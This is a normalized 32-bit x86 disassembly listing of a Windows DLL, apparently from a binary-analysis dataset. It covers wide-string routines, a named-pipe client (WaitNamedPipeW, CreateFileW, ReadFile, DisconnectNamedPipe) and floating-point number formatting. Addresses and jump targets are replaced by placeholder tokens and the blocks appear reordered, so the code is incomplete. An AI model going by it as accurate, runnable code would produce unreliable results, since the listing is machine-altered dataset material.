lea esi [ eax + 0x1 ]
mov eax edi
call sub_100020a0
test al al
je r-xdata
push r--data
call sub_10015cff
mov eax edi
pop esi
retn
mov ecx [ edi + 0x10 ]
mov edx 0x8
cmp [ edi + 0x14 ] edx
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax edi
xor edx edx
mov [ eax + esi * 2 ] dx
mov eax [ edi ]
xor edx edx
mov [ eax + esi * 2 ] dx
mov eax edi
pop esi
retn
mov [ eax + ecx * 2 ] bx
mov [ edi + 0x10 ] esi
cmp [ edi + 0x14 ] edx
jb r-xdata
sub_10005280
push ebp
mov ebp esp
push 0xffffffff
push sub_10028b4b
mov eax [ fs : 0x0 ]
push eax
push ecx
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x1
lea edi [ esi + 0x8 ]
mov [ esi ] r--data
mov [ esi + 0x4 ] 0xffffffff
xor eax eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov [ edi ] ax
push 0x2
mov eax r--data
mov ecx edi
call sub_10001f10
push 0x0
lea ecx [ ebp + 0x24 ]
push ecx
or eax 0xffffffff
mov [ ebp - 0x4 ] 0x2
call sub_10001c20
push 0x6
mov eax r--data
mov ecx edi
call sub_10001cd0
push 0x0
lea edx [ ebp + 0x8 ]
push edx
or eax 0xffffffff
call sub_10001c20
mov edi 0x8
cmp [ ebp + 0x1c ] edi
jb r-xdata
xor ecx ecx
mov [ ebp + 0x1c ] 0x7
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] cx
cmp [ ebp + 0x38 ] edi
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_100173b1
add esp 0x4
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
mov esp ebp
pop ebp
retn 0x38
mov edx [ ebp + 0x24 ]
push edx
call sub_100173b1
add esp 0x4
sub_10005360
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov [ esi ] r--data
cmp eax 0xffffffff
je r-xdata
cmp [ esi + 0x1c ] 0x8
jb r-xdata
test eax eax
je r-xdata
xor eax eax
test [ ebp + 0x8 ] 0x1
mov [ esi + 0x1c ] 0x7
mov [ esi + 0x18 ] 0x0
mov [ esi + 0x8 ] ax
je r-xdata
mov edx [ esi + 0x8 ]
push edx
call sub_100173b1
add esp 0x4
push eax
call [ FlushFileBuffers@IAT ]
mov eax [ esi + 0x4 ]
push eax
call [ DisconnectNamedPipe@IAT ]
mov ecx [ esi + 0x4 ]
push ecx
call [ CloseHandle@IAT ]
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100173b1
add esp 0x4
sub_100053d0
mov ecx [ esi + 0x4 ]
xor al al
cmp ecx 0xffffffff
je r-xdata
retn
test ecx ecx
je r-xdata
push ecx
call [ FlushFileBuffers@IAT ]
mov eax [ esi + 0x4 ]
push eax
call [ DisconnectNamedPipe@IAT ]
mov ecx [ esi + 0x4 ]
push ecx
call [ CloseHandle@IAT ]
cmp eax 0x1
sete al
sub_10005400
push ebp
mov ebp esp
sub esp 0x10c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ esi + 0x14 ] 0x8
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10c ] eax
mov [ esi + 0x10 ] 0x0
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax [ ebp - 0x108 ]
shr eax 0x1
push eax
lea eax [ ebp - 0x104 ]
mov ecx esi
call sub_10001cd0
test bl bl
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0xea
jne r-xdata
push ebx
xor ecx ecx
push edi
mov edi [ ReadFile@IAT ]
mov [ eax ] cx
lea esp [ esp ]
mov ecx [ ebp - 0x10c ]
push 0x0
lea edx [ ebp - 0x108 ]
push edx
mov edx [ ecx + 0x4 ]
push 0x100
lea eax [ ebp - 0x104 ]
push eax
push edx
call edi
test eax eax
setne bl
test bl bl
jne r-xdata
pop edi
mov al 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10016ec3
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor al al
pop ebx
call sub_10016ec3
mov esp ebp
pop ebp
retn 0x4
sub_100054c0
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
mov eax [ esi + 0x4 ]
xor cl cl
test eax eax
je r-xdata
push ebx
push edi
lea edi [ esi + 0x8 ]
mov ebx 0x8
cmp [ edi + 0x14 ] ebx
jb r-xdata
cmp eax 0xffffffff
jne r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov al cl
pop esi
mov esp ebp
pop ebp
retn
pop edi
pop ebx
xor al al
pop esi
mov esp ebp
pop ebp
retn
cmp [ edi + 0x14 ] ebx
jb r-xdata
push 0x0
push eax
call [ WaitNamedPipeW@IAT ]
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x3
push 0x0
push 0x0
push 0xc0000000
push edi
call [ CreateFileW@IAT ]
mov [ esi + 0x4 ] eax
cmp eax 0xffffffff
je r-xdata
mov edi [ edi ]
push 0x0
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push eax
mov [ ebp - 0x4 ] 0x2
call [ SetNamedPipeHandleState@IAT ]
test eax eax
setne bl
test bl bl
jne r-xdata
pop edi
mov al bl
pop ebx
pop esi
mov esp ebp
pop ebp
retn
call sub_100053d0
sub_10005560
push ebp
mov ebp esp
sub esp 0x8
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0x8 ]
push ecx
push 0x1
lea edx [ ebp + 0x8 ]
push edx
lea eax [ ebp - 0x4 ]
push eax
call sub_10016639
mov ax [ ebp - 0x4 ]
add esp 0x14
mov esp ebp
pop ebp
retn
sub_10005590
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor esi esi
mov eax ebx
push edi
mov [ ebp - 0x8 ] esi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
lea edi [ eax + 0x1 ]
mov [ ebp - 0x10 ] edi
cmp edi esi
jbe r-xdata
inc esi
xor ecx ecx
mov eax esi
mov edx 0x2
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_10015dba
add esp 0x4
mov ebx eax
mov edi ebx
mov [ ebp - 0xc ] 0x0
test esi esi
je r-xdata
lea esp [ esp ]
xor ecx ecx
mov [ edi ] cx
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
lea esp [ esp ]
add ebx eax
inc esi
sub edi eax
jne r-xdata
add [ ebp + 0x8 ] eax
add edi 0x2
dec esi
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0x8 ]
push ecx
push edi
lea edx [ ebp - 0x4 ]
push ebx
push edx
call sub_10016639
add esp 0x14
test eax eax
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0xc ]
push ecx
push edx
push eax
push edi
call sub_10016639
add esp 0x14
test eax eax
jle r-xdata
sub_10005650
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax edx
push edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
push eax
push edx
mov ecx esi
call sub_10006300
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10005690
push ebp
mov ebp esp
push 0xffffffff
push sub_10028b12
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
xor edi edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x2c ] esi
cmp ecx edi
je r-xdata
mov [ ebp - 0x4 ] edi
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
cmp [ eax + esi + 0xc ] edi
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
cmp [ ecx + esi + 0xc ] edi
sete cl
mov [ ebp - 0x28 ] cl
mov [ ebp - 0x4 ] 0x1
test cl cl
je r-xdata
mov eax [ eax + esi + 0x3c ]
cmp eax edi
je r-xdata
mov edx [ esi ]
mov ecx [ edx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + 0x4 ]
add eax esi
lea edi [ ebp - 0x1c ]
call sub_100034b0
mov edi eax
mov [ ebp - 0x4 ] 0x2
call sub_10007ca0
mov [ ebp - 0x4 ] 0x1
mov ebx [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
test ebx ebx
je r-xdata
mov ecx eax
call sub_10003920
mov [ ebp - 0x4 ] 0x5
call j_sub_1001a4cd
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx [ ebp + 0xc ]
mov edi [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0x3
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx [ ecx + esi + 0x38 ]
mov edi [ edi ]
mov [ ebp - 0x24 ] 0x0
movzx ecx [ ecx + esi + 0x40 ]
push ebx
push ecx
mov ecx [ ebp - 0x14 ]
add eax esi
push eax
push edx
mov edx [ ebp - 0x24 ]
push edx
mov edx [ edi + 0x18 ]
lea eax [ ebp - 0x24 ]
push eax
call edx
cmp [ ebp - 0x24 ] 0x0
mov edi 0x4
jne r-xdata
push 0x0
lea ecx [ ebp - 0x20 ]
call sub_100163b9
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_100064f0
push 0x0
call sub_100033b0
or eax 0x4
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov edi [ ebp - 0x18 ]
mov edi [ ebx + 0x4 ]
neg edi
sbb edi edi
lea ecx [ ebp - 0x20 ]
not edi
call sub_100163e1
and edi ebx
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
mov edx [ edi ]
mov eax [ edx ]
push 0x1
mov ecx edi
call eax
dec eax
mov [ ebx + 0x4 ] eax
sub_100057c2
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
call sub_100033b0
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
or eax 0x4
sub_10005880
push ebp
mov ebp esp
push 0xffffffff
push sub_10028f38
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi ecx
mov ecx [ eax + 0x40 ]
xor edi edi
mov [ ebp - 0x4c ] edi
test cl 0x2
jne r-xdata
test cl 0x4
jne r-xdata
mov edx [ eax + 0x24 ]
cmp [ edx ] edi
je r-xdata
mov ebx 0x7
xor edx edx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x48 ] dx
mov [ ebp - 0x4 ] 0x2
mov [ esi + 0x10 ] edi
xor eax eax
mov [ esi + 0x14 ] ebx
lea edi [ ebp - 0x48 ]
mov [ esi ] ax
call sub_10001bb0
cmp [ ebp - 0x34 ] 0x8
jb r-xdata
mov ecx [ eax + 0x20 ]
cmp [ ecx ] edi
je r-xdata
mov edx [ edx ]
mov ecx [ eax + 0x3c ]
cmp ecx edx
jae r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10016ec3
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x48 ]
mov ecx [ ecx ]
mov edx [ eax + 0x30 ]
mov edx [ edx ]
lea ecx [ ecx + edx * 2 ]
mov edx [ eax + 0x10 ]
mov eax [ edx ]
sub ecx eax
sar ecx 0x1
xor edx edx
push ecx
mov ebx 0x7
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] dx
call sub_10001f10
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov eax [ eax + 0x14 ]
mov eax [ eax ]
sub ecx eax
sar ecx 0x1
xor edx edx
push ecx
mov ebx 0x7
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] dx
call sub_10001f10
mov [ ebp - 0x4 ] edi
mov ecx edx
mov [ esi + 0x10 ] edi
xor eax eax
mov [ esi + 0x14 ] ebx
lea edi [ ebp - 0x2c ]
mov [ esi ] ax
call sub_10001bb0
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov ecx [ ebp - 0x2c ]
jmp r-xdata
push ecx
call sub_100173b1
add esp 0x4
sub_100059c0
push ebp
mov ebp esp
push 0xffffffff
push sub_10028ac8
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
call j_sub_1001a4cd
test al al
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov eax [ edx + eax + 0x38 ]
test eax eax
je r-xdata
mov ecx [ esi ]
call sub_100064f0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
call eax
sub_10005a30
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10028a90
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x58 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x70 ]
mov [ fs : 0x0 ] eax
movzx eax [ ebp + 0x18 ]
mov ebx [ ebp + 0x14 ]
test [ ebx + 0x14 ] 0x4000
mov esi [ ebp + 0x8 ]
mov [ esp + 0x1c ] esi
mov [ esp + 0x14 ] eax
jne r-xdata
lea edi [ esp + 0x18 ]
mov eax ebx
call sub_100034b0
mov edi eax
mov [ esp + 0x78 ] 0x0
call sub_10007de0
mov [ esp + 0x78 ] 0xffffffff
mov edi [ esp + 0x18 ]
mov [ esp + 0x20 ] eax
test edi edi
je r-xdata
movzx edi [ ebp + 0x1c ]
mov edx [ ecx ]
mov edx [ edx + 0x1c ]
push edi
push eax
mov eax [ ebp + 0x10 ]
push ebx
push eax
mov eax [ ebp + 0xc ]
push eax
push esi
call edx
mov eax esi
jmp r-xdata
xor eax eax
mov [ esp + 0x44 ] 0x7
mov [ esp + 0x40 ] 0x0
mov [ esp + 0x30 ] ax
mov [ esp + 0x78 ] 0x1
mov ecx [ esp + 0x20 ]
lea esi [ esp + 0x4c ]
cmp [ ebp + 0x1c ] al
je r-xdata
push 0x0
lea ecx [ esp + 0x2c ]
call sub_100163b9
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x70 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x58 ]
xor ecx esp
call sub_10016ec3
mov esp ebp
pop ebp
retn 0x18
call sub_10006fc0
mov edi eax
lea esi [ esp + 0x30 ]
mov [ esp + 0x78 ] 0x3
call sub_10001bb0
mov [ esp + 0x78 ] 0x1
cmp [ esp + 0x60 ] 0x8
jb r-xdata
call sub_10006fe0
mov edi eax
lea esi [ esp + 0x30 ]
mov [ esp + 0x78 ] 0x2
call sub_10001bb0
mov [ esp + 0x78 ] 0x1
cmp [ esp + 0x60 ] 0x8
jb r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ esp + 0x28 ]
not esi
call sub_100163e1
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov esi [ ebx + 0x20 ]
mov eax [ esp + 0x40 ]
xor edi edi
cmp [ ebx + 0x24 ] edi
jl r-xdata
mov edx [ esp + 0x4c ]
push edx
mov ecx [ esp + 0x4c ]
push ecx
jmp r-xdata
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
xor esi esi
jg r-xdata
call sub_100173b1
add esp 0x4
cmp [ esp + 0x44 ] 0x8
mov ecx [ esp + 0x30 ]
jae r-xdata
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push edx
push eax
lea ecx [ esp + 0x30 ]
mov eax esi
mov esi [ esp + 0x1c ]
push ecx
call sub_10006f50
mov edx [ eax ]
mov [ ebp + 0xc ] edx
mov eax [ eax + 0x4 ]
add esp 0xc
mov [ ebp + 0x10 ] eax
mov eax [ esp + 0x40 ]
xor esi esi
cmp esi eax
jbe r-xdata
cmp esi edi
jbe r-xdata
mov edx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0xc ]
push edx
lea edx [ esp + 0x28 ]
push edx
call sub_10006ee0
mov ecx [ eax ]
add esp 0xc
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
push eax
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x24 ] edi
mov ebx [ esp + 0x20 ]
mov [ ebp + 0x10 ] eax
push ecx
mov eax esi
mov esi [ esp + 0x1c ]
push ebx
call sub_10006f50
add esp 0xc
cmp [ esp + 0x44 ] 0x8
jb r-xdata
lea ecx [ esp + 0x30 ]
sub esi eax
jmp r-xdata
mov eax ebx
mov eax [ esp + 0x30 ]
push eax
call sub_100173b1
add esp 0x4
mov ecx [ ebx + 0x14 ]
and ecx 0x1c0
cmp ecx 0x40
je r-xdata
sub_10005c70
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x14 ]
mov edx [ ebx + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
push eax
mov eax [ ebp + 0x1c ]
mov [ esp + 0x10 ] ecx
mov ecx [ ebp + 0xc ]
push ecx
push eax
mov edi r--data
lea eax [ esp + 0x1c ]
call sub_10006bb0
push eax
lea ecx [ esp + 0x28 ]
push 0x40
push ecx
call sub_1001759a
mov edx [ esp + 0x24 ]
mov ecx [ ebp + 0x18 ]
add esp 0x10
push eax
push ebx
push esi
push edx
lea edx [ esp + 0x30 ]
call sub_10006c30
mov ecx [ esp + 0x74 ]
add esp 0x18
pop edi
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_10016ec3
mov esp ebp
pop ebp
retn 0x18
sub_10005cf0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x14 ]
mov edx [ ebx + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
push eax
mov eax [ ebp + 0x1c ]
mov [ esp + 0x10 ] ecx
mov ecx [ ebp + 0xc ]
push ecx
push eax
mov edi r--data
lea eax [ esp + 0x1c ]
call sub_10006bb0
push eax
lea ecx [ esp + 0x28 ]
push 0x40
push ecx
call sub_1001759a
mov edx [ esp + 0x24 ]
mov ecx [ ebp + 0x18 ]
add esp 0x10
push eax
push ebx
push esi
push edx
lea edx [ esp + 0x30 ]
call sub_10006c30
mov ecx [ esp + 0x74 ]
add esp 0x18
pop edi
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_10016ec3
mov esp ebp
pop ebp
retn 0x18
sub_10005d70
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x14 ]
mov edx [ ebx + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
push eax
mov eax [ ebp + 0x20 ]
mov [ esp + 0x10 ] ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x1c ]
push eax
push ecx
mov edi r--data
lea eax [ esp + 0x20 ]
call sub_10006bb0
push eax
lea edx [ esp + 0x2c ]
push 0x40
push edx
call sub_1001759a
mov ecx [ ebp + 0x18 ]
add esp 0x14
push eax
mov eax [ esp + 0x18 ]
push ebx
push esi
push eax
lea edx [ esp + 0x30 ]
call sub_10006c30
mov ecx [ esp + 0x74 ]
add esp 0x18
pop edi
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_10016ec3
mov esp ebp
pop ebp
retn 0x1c
sub_10005df0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x14 ]
mov edx [ ebx + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
push eax
mov eax [ ebp + 0x20 ]
mov [ esp + 0x10 ] ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x1c ]
push eax
push ecx
mov edi r--data
lea eax [ esp + 0x20 ]
call sub_10006bb0
push eax
lea edx [ esp + 0x2c ]
push 0x40
push edx
call sub_1001759a
mov ecx [ ebp + 0x18 ]
add esp 0x14
push eax
mov eax [ esp + 0x18 ]
push ebx
push esi
push eax
lea edx [ esp + 0x30 ]
call sub_10006c30
mov ecx [ esp + 0x74 ]
add esp 0x18
pop edi
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_10016ec3
mov esp ebp
pop ebp
retn 0x1c
sub_10005e70
push ebp
mov ebp esp
and esp 0xffffffc0
sub esp 0xb4
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xb0 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
mov [ esp + 0x38 ] eax
mov eax [ ebx + 0x1c ]
xor edi edi
mov [ esp + 0x3c ] ecx
mov ecx [ ebx + 0x18 ]
cmp eax edi
jg r-xdata
mov esi ecx
jl r-xdata
mov [ esp + 0x34 ] esi
jg r-xdata
test [ ebx + 0x14 ] 0x2000
jne r-xdata
cmp ecx edi
ja r-xdata
mov [ esp + 0x40 ] 0x25
lea eax [ esp + 0x41 ]
test dl 0x20
je r-xdata
fld [ r--data ]
fmul st1
fld st1
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
mov [ esp + 0x34 ] 0x24
jmp r-xdata
cmp esi 0x24
jbe r-xdata
mov esi 0x6
xor eax eax
jmp r-xdata
test dl 0x10
je r-xdata
mov [ esp + 0x41 ] 0x2b
lea eax [ esp + 0x42 ]
fldz
fcom st1
fnstsw ax
test ah 0x41
jne r-xdata
mov eax [ esp + 0x34 ]
fld [ ebp + 0x1c ]
cdq
sub esi eax
sbb ecx edx
mov edx [ ebx + 0x14 ]
mov eax edx
and eax 0x3000
mov [ esp + 0x30 ] edi
cmp eax 0x2000
jne r-xdata
mov ecx eax
cmp ecx edi
jl r-xdata
and edx 0x3000
mov [ eax ] 0x2a2e
cmp edx 0x2000
jne r-xdata
mov [ eax ] 0x23
inc eax
mov [ esp + 0x2f ] 0x0
fxch st1
fxch st1
mov [ esp + 0x2f ] 0x1
fchs
jmp r-xdata
cmp edx 0x3000
jne r-xdata
mov cl 0x66
jmp r-xdata
cmp [ esp + 0x30 ] 0x1388
jae r-xdata
fstp st1
jmp r-xdata
fld [ r--data ]
fcom st1
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
cmp edx 0x1000
setne cl
lea ecx [ ecx + ecx + 0x65 ]
mov cl 0x61
jmp r-xdata
mov edx [ ebp + 0xc ]
mov [ eax + 0x2 ] cl
mov ecx [ ebp + 0x10 ]
push ecx
push edx
sub esp 0x8
fstp [ esp ]
mov [ eax + 0x3 ] 0x0
mov eax [ esp + 0x44 ]
push eax
lea ecx [ esp + 0x54 ]
push ecx
lea edx [ esp + 0x60 ]
push 0x6c
push edx
call sub_1001759a
mov ecx [ esp + 0x5c ]
mov edx [ esp + 0x50 ]
add esp 0x18
push eax
push esi
mov esi [ esp + 0x48 ]
push edi
lea eax [ esp + 0x5c ]
push eax
push ebx
push esi
push ecx
mov ecx [ ebp + 0x18 ]
call sub_100065c0
mov ecx [ esp + 0xe0 ]
add esp 0x24
pop edi
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_10016ec3
mov esp ebp
pop ebp
retn 0x1c
fdiv st2
add [ esp + 0x30 ] 0xa
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ esp + 0x2f ] 0x0
fstp st1
je r-xdata
test ecx ecx
jl r-xdata
fchs
jg r-xdata
fld [ r--data ]
jmp r-xdata
cmp esi 0xa
jb r-xdata
fcom st1
fnstsw ax
test ah 0x1
jne r-xdata
fstp st0
jmp r-xdata
cmp edi 0x1388
jae r-xdata
add esi 0xfffffff6
fxch st1
adc ecx 0xffffffff
fmul st2
add edi 0xa
test ecx ecx
jg r-xdata
fxch st1
jl r-xdata
fstp st1
cmp esi 0xa
jae r-xdata
sub_10006090
push ebp
mov ebp esp
and esp 0xffffffc0
sub esp 0xb4
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xb0 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
mov [ esp + 0x38 ] eax
mov eax [ ebx + 0x1c ]
xor edi edi
mov [ esp + 0x3c ] ecx
mov ecx [ ebx + 0x18 ]
cmp eax edi
jg r-xdata
mov esi ecx
jl r-xdata
mov [ esp + 0x34 ] esi
jg r-xdata
test [ ebx + 0x14 ] 0x2000
jne r-xdata
cmp ecx edi
ja r-xdata
fld [ ebp + 0x1c ]
fldz
fld [ ebp + 0x1c ]
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
mov [ esp + 0x34 ] 0x24
jmp r-xdata
cmp esi 0x24
jbe r-xdata
mov esi 0x6
xor eax eax
jmp r-xdata
test dl 0x10
je r-xdata
mov [ esp + 0x41 ] 0x2b
lea eax [ esp + 0x42 ]
mov [ esp + 0x2f ] 0x0
jmp r-xdata
mov [ esp + 0x2f ] 0x1
fchs
mov eax [ esp + 0x34 ]
cdq
sub esi eax
sbb ecx edx
mov edx [ ebx + 0x14 ]
mov eax edx
and eax 0x3000
mov [ esp + 0x30 ] edi
cmp eax 0x2000
jne r-xdata
mov ecx eax
cmp ecx edi
jl r-xdata
and edx 0x3000
mov [ eax ] 0x2a2e
mov [ eax + 0x2 ] 0x4c
cmp edx 0x2000
jne r-xdata
mov [ eax ] 0x23
inc eax
fld [ r--data ]
fcom st1
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
cmp [ esp + 0x30 ] 0x1388
jae r-xdata
fstp st1
jmp r-xdata
cmp edx 0x3000
jne r-xdata
mov cl 0x66
jmp r-xdata
fdiv st2
add [ esp + 0x30 ] 0xa
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
cmp edx 0x1000
setne cl
lea ecx [ ecx + ecx + 0x65 ]
mov cl 0x61
jmp r-xdata
mov edx [ ebp + 0xc ]
mov [ eax + 0x3 ] cl
mov ecx [ ebp + 0x10 ]
push ecx
push edx
sub esp 0x8
fstp [ esp ]
mov [ eax + 0x4 ] 0x0
mov eax [ esp + 0x44 ]
push eax
lea ecx [ esp + 0x54 ]
push ecx
lea edx [ esp + 0x60 ]
push 0x6c
push edx
call sub_1001759a
mov ecx [ esp + 0x5c ]
mov edx [ esp + 0x50 ]
add esp 0x18
push eax
push esi
mov esi [ esp + 0x48 ]
push edi
lea eax [ esp + 0x5c ]
push eax
push ebx
push esi
push ecx
mov ecx [ ebp + 0x18 ]
call sub_100065c0
mov ecx [ esp + 0xe0 ]
add esp 0x24
pop edi
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_10016ec3
mov esp ebp
pop ebp
retn 0x1c
fxch st1
fstp st0
cmp [ esp + 0x2f ] 0x0
fstp st1
je r-xdata
test ecx ecx
jl r-xdata
